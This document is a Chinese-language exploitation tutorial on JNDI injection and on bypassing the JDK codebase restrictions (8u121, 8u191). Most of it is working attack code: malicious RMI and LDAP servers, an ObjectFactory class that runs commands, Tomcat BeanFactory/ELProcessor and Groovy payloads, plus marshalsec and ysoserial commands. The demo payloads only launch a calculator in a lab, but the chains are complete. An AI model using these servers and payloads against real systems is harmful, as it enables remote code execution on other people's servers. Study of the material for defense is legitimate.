# JNDI注入利用绕过高版本JDK限制

![Untitled](JNDI%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%E9%99%90%E5%88%B6%203f0efdc038d24037aff71da4a248cd94/Untitled.png)

# JNDI概念

全称是Java命名和目录接口，是一种远程的Java API，他允许客户端通过不同的服务协议去获取数据或者对象。

JNDI目前支持的协议：

- LDAP(常用)
- DNS
- RMI(常用)
- NIS
- CORBA等

### LDAP目录服务

LDAP全称是轻量级目录访问协议

LDAP的服务处理工厂类是：com.sun.jndi.ldap.LdapCtxFactory，连接LDAP之前需要配置好远程的LDAP服务。

### RMI

RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在本地没有找到这个类，就会去远程加载codebase中的类。

# JNDI注入

最直观的代码就是:

```java
new InitialContext().lookup(request.getParameter("q"));
```

当`lookup()`函数的值可控时，可以自己搭建恶意的`rmi/ldap`服务，客户端加载我们恶意的服务端类对象codebase，并创建实例，使得static代码块中的代码被执行。

oracle在jdk8u121使用`trustURLCodebase`限制了rmi对于codebase的远程加载，但是可以使用ldap绕过，但是8u191之后ldap同样不能使用。由此本文展开对于8u191之后的jndi注入的利用。

# JDK对JNDI的限制

```java
JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。

JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。
```

# ****8u121之前****

## **使用RMI + JNDI Reference利用**

直接利用marshalsec发布RMI服务到1099

```java
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer  http://192.168.202.1:8000/#Evail
```

**限制版本：**JDK 6u132, JDK 7u122, JDK 8u121以下（不包括8u121）

在JDK 6u132, JDK 7u122, JDK 8u121版本开始

```java
com.sun.jndi.rmi.object.trustURLCodebase、
com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false
即默认不允许从远程的Codebase加载Reference工厂类
```

# ****8u191之前****

## **使用LDAP + JDNI Reference利用方式：**

- 新建一个恶意类并发布到http服务器
- 启动一个ldap服务器
- 控制客户端lookup()中的URL为我们的恶意LDAP地址

此方法在版本8u191（包括8u191）失效

**1.1 新建一个恶意类Evail，实现ObjectFactory接口：**

```java
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class Evail implements ObjectFactory {
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        String commond = "gnome-calculator";
        Runtime.getRuntime().exec(commond);
        return null;
    }
}
```

注意用idea新建时候把自带package代码给去掉

**1.2 把恶意类编译成class文件：**

```java
javac Evail.java
```

**1.3 在恶意类class文件目录下，使用python启动http服务发布到8000端口：**

```java
python3 -m http.server 8000
```

**1.4 启动服务端，把LDAP服务发布到9999端口，服务端代码：**

```java
package com.yy.jndi.ldap;

import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

public class Server {
    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main(String[] argsx) {
        String[] args = new String[]{"http://192.168.202.1:8000/#Evail", "9999"};
        int port = 0;
        if (args.length < 1 || args[0].indexOf('#') < 0) {
            System.err.println(Server.class.getSimpleName() + " <codebase_url#classname> [<port>]"); //$NON-NLS-1$
            System.exit(-1);
        } else if (args.length > 1) {
            port = Integer.parseInt(args[1]);
        }

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[0])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        /**
         *
         */
        public OperationInterceptor(URL cb) {
            this.codebase = cb;
        }

        /**
         * {@inheritDoc}
         *
         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
         */
        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            } catch (Exception e1) {
                e1.printStackTrace();
            }

        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if (refPos > 0) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}
```

**1.5 执行客户端，访问远程LDAP服务器（ubuntu作为受害机客户端，JDK版本控制为8u191以下）**

```java
package com.yy.jndi.ldap;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class Client {
    public static void main(String[] args) throws NamingException {
            String uri = "ldap://192.168.202.1:9999/Evail";
            Context ctx = new InitialContext();
            ctx.lookup(uri);
    }
}
```

1.6 执行成功 弹出计算器

**利用marshalsec**

其实以上发布ldap服务端的操作可以使用marshalsec来快速完成：

```java
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.202.1:8000/#Evail 9999
```

# ****8u191之后****

## ****JNDI+RMI的高版本绕过****

com.sun.jndi.rmi.object.trustURLCodebase、

com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false

即默认不允许从远程的Codebase加载Reference工厂类

所以原本的远程加载恶意类的方式已经失效，不过并没有限制从本地进行加载类文件，比如org.apache.naming.factory.BeanFactory

### ****利用tomcat8的类****

利用类为`org.apache.naming.factory.BeanFactory`（前提是受害机器得有tomcat的这个jar包）

org.apache.naming.factory.BeanFactory的绕过原理：

EL和Groovy之所以能打是因为LDAP和RMI在收到服务端反序列化来的`Reference`对象后根据`classFactory`属性从本地classpath中实例化一个 ObjectFactory 对象，然后调用这个对象的 `getObjectInstance` 方法。

在Tomcat的`catalina.jar`中有一个`org.apache.naming.factory.BeanFactory`类，这个类会把`Reference`对象的`className`属性作为类名去调用无参构造方法实例化一个对象。然后再从`Reference`对象的Addrs参数集合中取得 AddrType 是 forceString 的 String 参数。

接着根据取到的 forceString 参数按照`,`逗号分割成多个要执行的方法。再按`=`等于号分割成 propName 和 param。

最后会根据 propName 作为方法名称去反射获取一个参数类型是 `String.class`的方法，并按照 param 从 Addrs 中取到的 String 对象作为参数去反射调用该方法。

而刚好`javax.el.ELProcessor#eval`和 `groovy.lang.GroovyShell#evaluate`这两个方法都是可以只传一个String参数就能够执行攻击代码，且依赖库比较常见所以被经常使用。

```java
ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "",
        true, "org.apache.naming.factory.BeanFactory", null);
ref.add(new StringRefAddr("forceString", "x=eval"));

ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/bash','-c','/Applications/Calculator.app/Contents/MacOS/Calculator']).start()\")"));
return ref;
```

> 针对 RMI 利用的检查方式中最关键的就是 if (var8 != null && var8.getFactoryClassLocation() != null && !trustURLCodebase) 如果 FactoryClassLocation 为空，那么就会进入 NamingManager.getObjectInstance 在此方法会调用 Reference 中的ObjectFactory。因此绕过思路为在目标 classpath 中寻找实现 ObjectFactory 接口的类。在 Tomcat 中有一处可以利用的符合条件的类org.apache.naming.factory.BeanFactory 在此类中会获取 Reference 中的forceString 得到其中的值之后会判断是否包含等号，如果包含则用等号分割，将前一半当做方法名，后一半当做 Hashmap 中的 key。如果不包含等号则方法名变成 set开头。值得注意的是此方法中已经指定了参数类型为 String。后面将会利用反射执行前面所提到的方法。因此需要找到使用了 String 作为参数，并且能 RCE的方法。在javax.el.ELProcessor 中的 eval 方法就很合适
> 

参考：[https://bl4ck.in/tricks/2019/01/04/JNDI-Injection-Bypass.html](https://bl4ck.in/tricks/2019/01/04/JNDI-Injection-Bypass.html)

1. 无需搭建http服务，直接启动服务端（攻击机）代码：

```java
package com.yy.jndi.jdk8u121;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import org.apache.naming.ResourceRef;

public class RMIServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "org.apache.naming.factory.BeanFactory", (String)null);
        resourceRef.add(new StringRefAddr("forceString", "a=eval"));
        resourceRef.add(new StringRefAddr("a", "Runtime.getRuntime().exec(\"gnome-calculator\")"));
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(resourceRef);
        registry.bind("exp", refObjWrapper);
        System.out.println("Creating evil RMI registry on port 1099");
    }
}
```

2. 使用客户端（受害机ubuntu）进行连接即可命令执行，client端代码:

```java
package com.yy.jndi.rmi;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class Client {
    public static void main(String[] args) throws NamingException {
            String uri = "rmi://192.168.202.1:1099/exp";
            Context ctx = new InitialContext();
            ctx.lookup(uri);
    }
}
```

3. 执行客户端进行连接后，成功弹出计算器

**总结：**

适用版本：我目前测试了几个常用版本8u102、8u121、8u191、8u202都可以使用，可以说实用性很广了

利用前提：受害机器是tomcat8以上的版本，因为要tomcat8里面的jar包依赖

依赖了两个类都是tomcat8里面jar包存在的类

- org.apache.naming.factory.BeanFactory
- javax.el.ELProcessor

> javax.el.ELProcessor本身是Tomcat8中存在的库，所以仅限Tomcat8及更高版本环境下可以通过javax.el.ELProcessor进行攻击，对于使用广泛的SpringBoot应用来说，可被利用的Spring Boot Web Starter版本应在1.2.x及以上，因为1.1.x及1.0.x内置的是Tomcat7。
> 

### ****(2) 依赖groovy 2以上相关类****

客户端所需的jar包，pom.xml

```java
<dependency>
            <groupId>org.codehaus.groovy</groupId>
            <artifactId>groovy</artifactId>
            <version>2.4.5</version>
        </dependency>
```

服务端代码

```java
package com.yy.jndi.jdk8u121;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.StringRefAddr;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class ExecByGroovyParse {
    public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException {
        Registry registry = LocateRegistry.createRegistry(1099);
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=parseClass"));
        String script = String.format("@groovy.transform.ASTTest(value={\n" +
                        "    assert java.lang.Runtime.getRuntime().exec(\"%s\")\n" +
                        "})\n" +
                        "def x\n",
//                commandGenerator.getBase64CommandTpl()
                "gnome-calculator"
        );
        ref.add(new StringRefAddr("x",script));
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(ref);
        registry.bind("exp", refObjWrapper);
        System.out.println("Creating evil RMI registry on port 1099");
    }
}
```

### ****(3) 依赖groovy任意版本的类****

比如版本1.5

```java
<!-- https://mvnrepository.com/artifact/org.codehaus.groovy/groovy-all -->
		<dependency>
			<groupId>org.codehaus.groovy</groupId>
			<artifactId>groovy-all</artifactId>
			<version>1.5.0</version>
		</dependency>
```

服务端代码

```java
package com.yy.jndi.jdk8u121;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.StringRefAddr;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class ExecByGroovy {
    public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException {
        Registry registry = LocateRegistry.createRegistry(1099);
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=evaluate"));
        String script = String.format("'%s'.execute()", "gnome-calculator"); //commandGenerator.getBase64CommandTpl());
        ref.add(new StringRefAddr("x",script));
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(ref);
        registry.bind("exp", refObjWrapper);
        System.out.println("Creating evil RMI registry on port 1099");
    }
}
```

## ****JNDI+LDAP高版本绕过****

JDK 6u211，7u201, 8u191, 11.0.1开始`com.sun.jndi.ldap.object.trustURLCodebase` 属性的默认值被调整为false，导致LDAP远程代码攻击方式开始失效

**利用`javaSerializedData`属性**

当javaSerializedData属性的`value`值不为空时，会对该值进行反序列化处理，当本地存在反序列化利用链时，即可触发。

假设目标存在一个CC链所需的类库，那么可以利用这点进行利用

**1.先使用ysoserial.jar生成CC链的poc**

```java
java -jar ysoserial.jar CommonsCollections5 gnome-calculator > poc.txt
```

**2.转换为base64编码后放到服务端代码里**

![Untitled](JNDI%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%E9%99%90%E5%88%B6%203f0efdc038d24037aff71da4a248cd94/Untitled%201.png)

服务端代码

```java
package com.yy.jndi.jdk8u191;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.Base64;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class LDAPServer {
    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main ( String[] tmp_args ) throws Exception{
        String[] args=new String[]{"http://localhost/#Evail"}; 
        int port = 6666;
        // LDAP服务搭建
        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
        config.setListenerConfigs(new InMemoryListenerConfig(
                "listen", //$NON-NLS-1$
                InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                port,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));

        config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
        ds.startListening();
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }

            e.addAttribute("javaSerializedData", Base64.decode("base64 encode payload"));

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
```

代码的String[]字符串里面ip并不影响payload执行，随便填或者默认localhost都可

**3.启动服务端后，客户端连接6666端口即可执行成功**

![Untitled](JNDI%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%E9%99%90%E5%88%B6%203f0efdc038d24037aff71da4a248cd94/Untitled%202.png)